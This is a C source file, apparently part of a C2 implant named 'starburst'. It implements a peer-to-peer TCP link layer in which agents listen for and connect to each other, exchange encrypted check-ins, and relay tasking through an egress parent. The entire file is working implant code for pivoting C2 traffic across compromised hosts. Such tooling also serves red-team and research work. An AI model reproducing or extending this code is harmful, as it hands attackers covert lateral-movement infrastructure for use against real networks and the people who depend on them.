#include "starburst.h"

static int tcp_raw_send(int sock, const uint8_t *data, uint32_t len) {
    uint8_t header[4];
    header[0] = (len >> 24) & 0xFF;
    header[1] = (len >> 16) & 0xFF;
    header[2] = (len >> 8)  & 0xFF;
    header[3] = len & 0xFF;

    uint32_t sent = 0;
    while (sent < 4) {
        ssize_t r = send(sock, header + sent, 4 - sent, 0);
        if (r <= 0) return -1;
        sent += (uint32_t)r;
    }

    sent = 0;
    while (sent < len) {
        uint32_t chunk = len - sent;
        if (chunk > TCP_RECV_BUF_MAX) chunk = TCP_RECV_BUF_MAX;
        ssize_t r = send(sock, data + sent, chunk, 0);
        if (r <= 0) return -1;
        sent += (uint32_t)r;
    }
    return 0;
}

int tcp_p2p_link_recv(int sock, uint8_t **data, uint32_t *len) {
    *data = NULL;
    *len = 0;

    fd_set rset;
    FD_ZERO(&rset);
    FD_SET(sock, &rset);
    struct timeval tv = { 0, 0 };
    if (select(sock + 1, &rset, NULL, NULL, &tv) <= 0) return 0;

    uint8_t header[4];
    uint32_t total_hdr = 0;
    while (total_hdr < 4) {
        ssize_t r = recv(sock, header + total_hdr, 4 - total_hdr, 0);
        if (r <= 0) return -1;
        total_hdr += (uint32_t)r;
    }

    uint32_t msg_size = ((uint32_t)header[0] << 24) |
                        ((uint32_t)header[1] << 16) |
                        ((uint32_t)header[2] << 8)  |
                        ((uint32_t)header[3]);

    if (msg_size == 0 || msg_size > 0x3C00000) return -1;

    uint8_t *buf = (uint8_t *)malloc(msg_size);
    if (!buf) return -1;

    uint32_t total_read = 0;
    while (total_read < msg_size) {
        uint32_t chunk = msg_size - total_read;
        if (chunk > TCP_RECV_BUF_MAX) chunk = TCP_RECV_BUF_MAX;
        ssize_t r = recv(sock, buf + total_read, chunk, 0);
        if (r <= 0) { free(buf); return -1; }
        total_read += (uint32_t)r;
    }

    *data = buf;
    *len = msg_size;
    return 1;
}

int tcp_p2p_link_send(tcp_link_t *link, const uint8_t *data, uint32_t len) {
    if (!link || link->sock < 0) return -1;
    return tcp_raw_send(link->sock, data, len);
}

int tcp_p2p_init_listener(int port) {
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) return -1;

    int reuse = 1;
    setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &reuse, sizeof(reuse));

    struct sockaddr_in addr = {0};
    addr.sin_family = AF_INET;
    addr.sin_port = htons((uint16_t)port);
    addr.sin_addr.s_addr = INADDR_ANY;

    if (bind(sock, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        close(sock);
        return -1;
    }

    if (listen(sock, 5) < 0) {
        close(sock);
        return -1;
    }

    int flags = fcntl(sock, F_GETFL, 0);
    fcntl(sock, F_SETFL, flags | O_NONBLOCK);

    g_state.tcp_listen_sock = sock;
    g_state.tcp_listen_port = port;
    DBG("tcp_p2p: listening on port %d", port);
    return 0;
}

void tcp_p2p_poll_links(void) {
    /* accept new connections on listener */
    if (g_state.tcp_listen_sock >= 0) {
        struct sockaddr_in client_addr;
        socklen_t client_len = sizeof(client_addr);
        int client = accept(g_state.tcp_listen_sock, (struct sockaddr *)&client_addr, &client_len);
        if (client >= 0) {
            int flags = fcntl(client, F_GETFL, 0);
            fcntl(client, F_SETFL, flags | O_NONBLOCK);

            /* send our encrypted checkin data so the parent agent can link us
             * format: base64(UUID + AES(checkin_tlv)) framed with 4-byte length */
            packer_t p;
            pk_init(&p);
            pk_byte(&p, ACTION_CHECKIN);
            pk_string(&p, g_state.uuid);

            uint32_t enc_len;
            uint8_t *enc = aes_encrypt(p.data, p.len, &enc_len);
            pk_free(&p);

            if (enc) {
                uint32_t uuid_len = (uint32_t)strlen(g_state.uuid);
                uint32_t raw_len = uuid_len + enc_len;
                uint8_t *raw = (uint8_t *)malloc(raw_len);
                memcpy(raw, g_state.uuid, uuid_len);
                memcpy(raw + uuid_len, enc, enc_len);
                free(enc);

                size_t b64_len;
                char *b64 = b64_encode(raw, raw_len, &b64_len);
                free(raw);

                if (b64) {
                    tcp_raw_send(client, (uint8_t *)b64, (uint32_t)b64_len);
                    free(b64);
                }
            }

            DBG("tcp_p2p: accepted connection from %s", inet_ntoa(client_addr.sin_addr));
        }
    }

    /* poll existing links for incoming data */
    tcp_link_t *cur = g_state.tcp_links;
    while (cur) {
        tcp_link_t *next = cur->next;

        if (cur->connected && cur->sock >= 0) {
            uint8_t *msg_buf = NULL;
            uint32_t msg_size = 0;

            int rc = tcp_p2p_link_recv(cur->sock, &msg_buf, &msg_size);
            if (rc > 0 && msg_buf) {
                /* extract UUID from base64 decoded data if present */
                size_t dec_len;
                uint8_t *dec = b64_decode((char *)msg_buf, msg_size > 48 ? 48 : msg_size, &dec_len);
                if (dec && dec_len >= 36) {
                    if (memcmp(cur->agent_id, dec, 36) != 0) {
                        memcpy(cur->agent_id, dec, 36);
                        cur->agent_id[36] = '\0';
                    }
                    free(dec);
                } else if (dec) {
                    free(dec);
                }

                /* queue as delegate message */
                packer_t dpkg;
                pk_init(&dpkg);
                pk_byte(&dpkg, ACTION_LINK_MSG);
                pk_string(&dpkg, cur->agent_id);
                pk_bytes(&dpkg, msg_buf, msg_size);

                pthread_mutex_lock(&g_state.rsp_mutex);
                rsp_queue(dpkg.data, dpkg.len);
                pthread_mutex_unlock(&g_state.rsp_mutex);

                pk_free(&dpkg);
                free(msg_buf);
            } else if (rc < 0) {
                /* link disconnected */
                DBG("tcp_p2p: link %s disconnected", cur->agent_id);
                close(cur->sock);
                cur->sock = -1;
                cur->connected = 0;

                packer_t rpkg;
                pk_init(&rpkg);
                pk_byte(&rpkg, ACTION_LINK_REMOVE);
                pk_int32(&rpkg, cur->link_id);
                pk_string(&rpkg, cur->agent_id);

                pthread_mutex_lock(&g_state.rsp_mutex);
                rsp_queue(rpkg.data, rpkg.len);
                pthread_mutex_unlock(&g_state.rsp_mutex);

                pk_free(&rpkg);
            }
        }

        cur = next;
    }
}

void tcp_p2p_destroy(void) {
    if (g_state.tcp_listen_sock >= 0) {
        close(g_state.tcp_listen_sock);
        g_state.tcp_listen_sock = -1;
    }

    tcp_link_t *cur = g_state.tcp_links;
    while (cur) {
        tcp_link_t *next = cur->next;
        if (cur->sock >= 0) close(cur->sock);
        free(cur);
        cur = next;
    }
    g_state.tcp_links = NULL;
}

void cmd_connect_handler(const char *task_uuid, parser_t *params) {
    char *hostname = pr_string(params);
    uint32_t port = pr_int32(params);

    if (!hostname || strlen(hostname) == 0) {
        queue_response(task_uuid, RSP_ERROR, "missing hostname");
        free(hostname);
        return;
    }

    struct addrinfo hints = {0}, *res = NULL;
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    char port_str[8];
    snprintf(port_str, sizeof(port_str), "%u", port);

    if (getaddrinfo(hostname, port_str, &hints, &res) != 0 || !res) {
        queue_response(task_uuid, RSP_ERROR, "resolve failed");
        free(hostname);
        return;
    }

    int sock = socket(res->ai_family, SOCK_STREAM, 0);
    if (sock < 0) {
        freeaddrinfo(res);
        queue_response(task_uuid, RSP_ERROR, "socket failed");
        free(hostname);
        return;
    }

    struct timeval tv = { 10, 0 };
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
    setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));

    if (connect(sock, res->ai_addr, res->ai_addrlen) < 0) {
        close(sock);
        freeaddrinfo(res);
        queue_response(task_uuid, RSP_ERROR, "connect failed");
        free(hostname);
        return;
    }
    freeaddrinfo(res);

    DBG("tcp_connect: connected to %s:%u", hostname, port);

    /* wait for P2P agent's checkin data */
    uint8_t *p2p_data = NULL;
    uint32_t p2p_len = 0;

    for (int attempt = 0; attempt < 300; attempt++) {
        int rc = tcp_p2p_link_recv(sock, &p2p_data, &p2p_len);
        if (rc > 0) break;
        if (rc < 0) { close(sock); free(hostname); queue_response(task_uuid, RSP_ERROR, "recv error"); return; }
        usleep(10000);
    }

    if (!p2p_data || p2p_len == 0) {
        close(sock);
        queue_response(task_uuid, RSP_ERROR, "no response from P2P agent");
        free(hostname);
        return;
    }

    tcp_link_t *link = (tcp_link_t *)calloc(1, sizeof(tcp_link_t));
    strncpy(link->task_uuid, task_uuid, 39);
    strncpy(link->hostname, hostname, 255);
    link->link_id = (uint32_t)(time(NULL) ^ getpid()) & 0x7FFFFFFF;
    link->sock = sock;
    link->port = (uint16_t)port;
    link->connected = 1;

    /* set non-blocking after handshake */
    int flags = fcntl(sock, F_GETFL, 0);
    fcntl(sock, F_SETFL, flags | O_NONBLOCK);

    /* extract UUID from P2P agent's response */
    size_t decoded_len;
    uint8_t *decoded = b64_decode((char *)p2p_data, p2p_len > 48 ? 48 : p2p_len, &decoded_len);
    if (decoded && decoded_len >= 36) {
        memcpy(link->agent_id, decoded, 36);
        link->agent_id[36] = '\0';
    }
    if (decoded) free(decoded);

    /* insert into link list */
    link->next = g_state.tcp_links;
    g_state.tcp_links = link;

    /* queue LINK_ADD response */
    packer_t pkg;
    pk_init(&pkg);
    pk_byte(&pkg, ACTION_LINK_ADD);
    pk_byte(&pkg, C2_PROFILE_TCP);
    pk_int32(&pkg, link->link_id);
    pk_string(&pkg, link->agent_id);
    pk_bytes(&pkg, p2p_data, p2p_len);

    pthread_mutex_lock(&g_state.rsp_mutex);
    rsp_queue(pkg.data, pkg.len);
    pthread_mutex_unlock(&g_state.rsp_mutex);

    pk_free(&pkg);
    free(p2p_data);

    char msg[512];
    snprintf(msg, sizeof(msg), "Connected to %s:%u\nAgent: %s", hostname, port, link->agent_id);
    queue_response(task_uuid, RSP_SUCCESS, msg);
    free(hostname);
}

void cmd_disconnect_handler(const char *task_uuid, parser_t *params) {
    char *agent_uuid = pr_string(params);

    tcp_link_t *prev = NULL;
    tcp_link_t *cur = g_state.tcp_links;
    while (cur) {
        if (strcmp(cur->agent_id, agent_uuid) == 0) {
            if (prev) prev->next = cur->next;
            else g_state.tcp_links = cur->next;

            packer_t rpkg;
            pk_init(&rpkg);
            pk_byte(&rpkg, ACTION_LINK_REMOVE);
            pk_int32(&rpkg, cur->link_id);
            pk_string(&rpkg, cur->agent_id);

            pthread_mutex_lock(&g_state.rsp_mutex);
            rsp_queue(rpkg.data, rpkg.len);
            pthread_mutex_unlock(&g_state.rsp_mutex);

            pk_free(&rpkg);

            if (cur->sock >= 0) close(cur->sock);
            free(cur);

            queue_response(task_uuid, RSP_SUCCESS, "disconnected");
            free(agent_uuid);
            return;
        }
        prev = cur;
        cur = cur->next;
    }

    queue_response(task_uuid, RSP_ERROR, "link not found");
    free(agent_uuid);
}

/* ================================================================
 *  TCP P2P CHILD TRANSPORT
 *  Used when built with TCP_TRANSPORT: the child agent listens
 *  for the egress parent to connect, then sends all data over
 *  that TCP connection instead of HTTPS.
 * ================================================================ */

int tcp_p2p_child_accept(void) {
    if (g_state.tcp_listen_sock < 0) return 0;
    if (g_state.p2p_parent_sock >= 0) return 1;

    struct sockaddr_in client_addr;
    socklen_t client_len = sizeof(client_addr);
    int client = accept(g_state.tcp_listen_sock, (struct sockaddr *)&client_addr, &client_len);
    if (client < 0) return 0;

    DBG("tcp_p2p_child: parent connected from %s", inet_ntoa(client_addr.sin_addr));

    struct timeval tv = { 30, 0 };
    setsockopt(client, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
    setsockopt(client, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));

    /* send mini-checkin so the parent can identify us */
    packer_t p;
    pk_init(&p);
    pk_byte(&p, ACTION_CHECKIN);
    pk_string(&p, g_state.uuid);

    uint32_t enc_len;
    uint8_t *enc = aes_encrypt(p.data, p.len, &enc_len);
    pk_free(&p);

    if (enc) {
        uint32_t uuid_len = (uint32_t)strlen(g_state.uuid);
        uint32_t raw_len = uuid_len + enc_len;
        uint8_t *raw = (uint8_t *)malloc(raw_len);
        memcpy(raw, g_state.uuid, uuid_len);
        memcpy(raw + uuid_len, enc, enc_len);
        free(enc);

        size_t b64_len;
        char *b64 = b64_encode(raw, raw_len, &b64_len);
        free(raw);

        if (b64) {
            tcp_raw_send(client, (uint8_t *)b64, (uint32_t)b64_len);
            free(b64);
        }
    }

    g_state.p2p_parent_sock = client;
    DBG("tcp_p2p_child: parent link established");
    return 1;
}

static int tcp_recv_blocking(int sock, uint8_t **data, uint32_t *len, int timeout_sec) {
    *data = NULL;
    *len = 0;

    struct timeval tv = { timeout_sec, 0 };
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));

    uint8_t header[4];
    uint32_t total_hdr = 0;
    while (total_hdr < 4) {
        ssize_t r = recv(sock, header + total_hdr, 4 - total_hdr, 0);
        if (r <= 0) return -1;
        total_hdr += (uint32_t)r;
    }

    uint32_t msg_size = ((uint32_t)header[0] << 24) |
                        ((uint32_t)header[1] << 16) |
                        ((uint32_t)header[2] << 8)  |
                        ((uint32_t)header[3]);

    if (msg_size == 0 || msg_size > 0x3C00000) return -1;

    uint8_t *buf = (uint8_t *)malloc(msg_size);
    if (!buf) return -1;

    uint32_t total_read = 0;
    while (total_read < msg_size) {
        uint32_t chunk = msg_size - total_read;
        if (chunk > TCP_RECV_BUF_MAX) chunk = TCP_RECV_BUF_MAX;
        ssize_t r = recv(sock, buf + total_read, chunk, 0);
        if (r <= 0) { free(buf); return -1; }
        total_read += (uint32_t)r;
    }

    *data = buf;
    *len = msg_size;
    return 0;
}

uint8_t *tcp_p2p_send(const uint8_t *data, uint32_t data_len, uint32_t *resp_len) {
    *resp_len = 0;
    if (g_state.p2p_parent_sock < 0) {
        DBG("tcp_p2p_send: no parent connection");
        return NULL;
    }

    DBG("tcp_p2p_send: sending %u bytes", data_len);
    if (tcp_raw_send(g_state.p2p_parent_sock, data, data_len) < 0) {
        DBG("tcp_p2p_send: send failed, parent disconnected");
        close(g_state.p2p_parent_sock);
        g_state.p2p_parent_sock = -1;
        return NULL;
    }

    uint8_t *resp_data = NULL;
    uint32_t resp_data_len = 0;
    if (tcp_recv_blocking(g_state.p2p_parent_sock, &resp_data, &resp_data_len, 60) < 0) {
        DBG("tcp_p2p_send: recv timeout/error");
        close(g_state.p2p_parent_sock);
        g_state.p2p_parent_sock = -1;
        return NULL;
    }

    DBG("tcp_p2p_send: received %u bytes", resp_data_len);
    *resp_len = resp_data_len;
    return resp_data;
}
